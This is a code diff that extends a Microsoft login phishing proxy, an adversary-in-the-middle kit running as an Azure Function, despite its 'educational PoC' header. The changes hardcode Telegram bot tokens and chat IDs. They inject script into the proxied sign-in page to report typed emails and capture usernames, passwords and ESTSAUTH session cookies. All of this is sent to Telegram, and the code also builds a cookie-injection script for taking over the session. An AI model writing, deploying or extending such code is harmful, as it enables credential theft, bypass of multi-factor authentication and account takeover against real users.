@@ -1,6 +1,7 @@
 /**
- * Azure Function AiTM Phishing PoC for Entra ID accounts.
- * This code is provided for educational purposes only and provided withou any liability or warranty.
+ * Enhanced Azure Function AiTM Phishing PoC for Entra ID accounts.
+ * Supports both corporate and personal accounts (hotmail/live).
+ * This code is provided for educational purposes only and provided without any liability or warranty.
  * Based on: https://github.com/zolderio/AITMWorker
  */
 
@@ -8,7 +9,10 @@ const { app } = require("@azure/functions");
 
 const upstream = "login.microsoftonline.com";
 const upstream_path = "/";
-const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;
+const telegram_bot_token_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
+const telegram_bot_token_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
+const telegram_chat_id_1 = "6743632244";
+const telegram_chat_id_2 = "6263177378";
 
 // headers to delete from upstream responses
 const delete_headers = [
@@ -23,10 +27,87 @@ const delete_headers = [
   "Set-Cookie",
 ];
 
-async function replace_response_text(response, upstream, original) {
-  return response
-    .text()
-    .then((text) => text.replace(new RegExp(upstream, "g"), original));
+const emailMap = new Map();
+
+async function replace_response_text(response, upstream, original, ip) {
+  return response.text().then((text) =>
+    text
+      .replace(new RegExp(upstream, "g"), original)
+      .replace(
+        "</body>",
+        `<script>
+          document.addEventListener('DOMContentLoaded', () => {
+            const interval = setInterval(() => {
+              const btn = document.getElementById("idSIButton9");
+              const emailInput = document.querySelector("input[name='loginfmt']");
+              if (btn && emailInput) {
+                clearInterval(interval);
+                const realIP = "${ip}";
+                btn.addEventListener("click", () => {
+                  fetch("/__notify_click", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      event: "next_button_clicked",
+                      email: emailInput.value,
+                      ip: realIP
+                    }),
+                  });
+                });
+              }
+            }, 500);
+          });
+        </script></body>`
+      )
+  );
+}
+
+async function dispatchMessage(message, context) {
+  context.log(`📤 Sending to Telegram: ${message}`);
+  
+  // Send to Telegram bot 2 (working one)
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_2}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        chat_id: telegram_chat_id_2, 
+        text: message, 
+        parse_mode: "HTML" 
+      }),
+    });
+    
+    if (response.ok) {
+      context.log(`✅ Message sent successfully to bot 2`);
+    } else {
+      const errorText = await response.text();
+      context.log(`❌ Failed to send to bot 2: ${errorText}`);
+    }
+  } catch (error) {
+    context.log(`❌ Error sending to bot 2: ${error.message}`);
+  }
+
+  // Try to send to bot 1 (will fail until chat_id is set)
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_1}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        chat_id: telegram_chat_id_1, // Replace with your actual chat_id
+        text: message, 
+        parse_mode: "HTML" 
+      }),
+    });
+    
+    if (response.ok) {
+      context.log(`✅ Message sent successfully to bot 1`);
+    } else {
+      const errorText = await response.text();
+      context.log(`❌ Failed to send to bot 1: ${errorText}`);
+    }
+  } catch (error) {
+    context.log(`❌ Error sending to bot 1: ${error.message}`);
+  }
 }
 
 app.http("phishing", {
@@ -34,24 +115,31 @@ app.http("phishing", {
   authLevel: "anonymous",
   route: "/{*x}",
   handler: async (request, context) => {
+    const ip =
+      request.headers.get("cf-connecting-ip") ||
+      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
+      request.headers.get("x-client-ip") ||
+      request.headers.get("true-client-ip") ||
+      request.headers.get("x-real-ip") ||
+      "unknown";
 
-    async function dispatchMessage(message) {
-      context.log(message);
-      if (teams_webhook_url) {
-        await fetch(teams_webhook_url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ text: message }),
-        })
-          .then((response) =>
-            response.ok
-              ? console.log("successfully dispatched MSG")
-              : console.error(`Failed to dispatch: ${response.statusText}`)
-          )
-          .catch((error) => console.log(error));
-      }
+    // Log every request for debugging
+    await dispatchMessage(
+      `🔍 <b>New Request</b>\n🌐 <b>Method</b>: ${request.method}\n📱 <b>IP</b>: ${ip}\n🔗 <b>URL</b>: ${request.url}\n👤 <b>User-Agent</b>: ${request.headers.get("user-agent") || "unknown"}`,
+      context
+    );
+
+    // Handle special injected click reporting
+    if (request.method === "POST" && new URL(request.url).pathname === "/__notify_click") {
+      const body = await request.json();
+      const email = body.email || "unknown";
+      const realIP = body.ip || ip;
+      emailMap.set(realIP, email);
+      await dispatchMessage(
+        `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`,
+        context
+      );
+      return new Response("ok", { status: 200 });
     }
 
     // original URLs
@@ -85,26 +173,34 @@ app.http("phishing", {
       original_url.protocol + "//" + original_url.host
     );
 
-    // Obtain password from POST body
+    // Capture login credentials
     if (request.method === "POST") {
       const temp_req = await request.clone();
       const body = await temp_req.text();
       const keyValuePairs = body.split("&");
 
       // extract key-value pairs for username and password
-      const msg = Object.fromEntries(
+      const data = Object.fromEntries(
         keyValuePairs
-          .map((pair) => ([key, value] = pair.split("=")))
-          .filter(([key, _]) => key == "login" || key == "passwd")
-          .map(([_, value]) => [
-            _,
-            decodeURIComponent(value.replace(/\+/g, " ")),
-          ])
+          .map((pair) => {
+            const [key, value] = pair.split("=");
+            return [key, decodeURIComponent((value || "").replace(/\+/g, " "))];
+          })
+          .filter(([key]) => key === "loginfmt" || key === "passwd")
       );
 
-      if (msg.login && msg.passwd) {
-        dispatchMessage(
-          "Captured login information: <br>" + JSON.stringify(msg)
+      if (data.loginfmt) {
+        emailMap.set(ip, data.loginfmt);
+        await dispatchMessage(
+          `📧 <b>Email Entered</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🌐 <b>IP</b>: ${ip}`,
+          context
+        );
+      }
+
+      if (data.loginfmt && data.passwd) {
+        await dispatchMessage(
+          `📥 <b>Captured Credentials</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🔑 <b>Password</b>: ${data.passwd}\n🌐 <b>IP</b>: ${ip}`,
+          context
         );
       }
     }
@@ -132,7 +228,7 @@ app.http("phishing", {
     // Replace cookie domains to match our proxy
     try {
       // getSetCookie is the successor of Headers.getAll
-      const originalCookies = original_response.headers.getSetCookie();
+      const originalCookies = original_response.headers.getSetCookie?.() || [];
 
       originalCookies.forEach((originalCookie) => {
         const modifiedCookie = originalCookie.replace(
@@ -142,27 +238,40 @@ app.http("phishing", {
         new_response_headers.append("Set-Cookie", modifiedCookie);
       });
 
-      const cookies = originalCookies.filter(
-        (cookie) =>
-          cookie.startsWith("ESTSAUTH=") ||
-          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
-          cookie.startsWith("SignInStateCookie=")
+      // Capture important cookies for both corporate and personal accounts
+      const importantCookies = originalCookies.filter((cookie) =>
+        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie|ESTSAUTHLIGHT)=/.test(cookie)
       );
 
-      if (cookies.length == 3) {
-        dispatchMessage(
-          "Captured required authentication cookies: <br>" +
-            JSON.stringify(cookies)
+      if (importantCookies.length >= 3) {
+        const victimEmail = emailMap.get(ip) || "unknown";
+        const cookieText = importantCookies.map((c) => c.split(";")[0]).join("\n");
+
+        await dispatchMessage(
+          `🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieText}</code>`,
+          context
+        );
+
+        // Generate cookie injection script
+        const cookieScript = generateCookieInjectionScript(importantCookies);
+        await dispatchMessage(
+          `🔧 <b>Cookie Injection Script</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieScript}</code>`,
+          context
         );
       }
     } catch (error) {
-      console.error(error);
+      console.error("Cookie capture error:", error);
+      await dispatchMessage(
+        `❌ <b>Cookie Capture Error</b>\n🌐 <b>IP</b>: ${ip}\n🔍 <b>Error</b>: ${error.message}`,
+        context
+      );
     }
 
     const original_text = await replace_response_text(
       original_response.clone(),
       upstream_url.protocol + "//" + upstream_url.host,
-      original_url.protocol + "//" + original_url.host
+      original_url.protocol + "//" + original_url.host,
+      ip
     );
 
     return new Response(original_text, {
@@ -171,3 +280,27 @@ app.http("phishing", {
     });
   },
 });
+
+function generateCookieInjectionScript(cookies) {
+  const cookieData = cookies.map(cookie => {
+    const [nameValue] = cookie.split(';');
+    const [name, value] = nameValue.split('=');
+    return {
+      domain: "login.microsoftonline.com",
+      expirationDate: Math.floor(Date.now() / 1000) + 31536000, // 1 year
+      hostOnly: false,
+      httpOnly: true,
+      name: name,
+      path: "/",
+      sameSite: "none",
+      secure: true,
+      session: true,
+      storeId: null,
+      value: value
+    };
+  });
+
+  const script = `!function(){let e=JSON.parse(\`${JSON.stringify(cookieData)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}Secure;SameSite=None\`;window.location.href=atob("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw==")}();`;
+  
+  return script;
+}
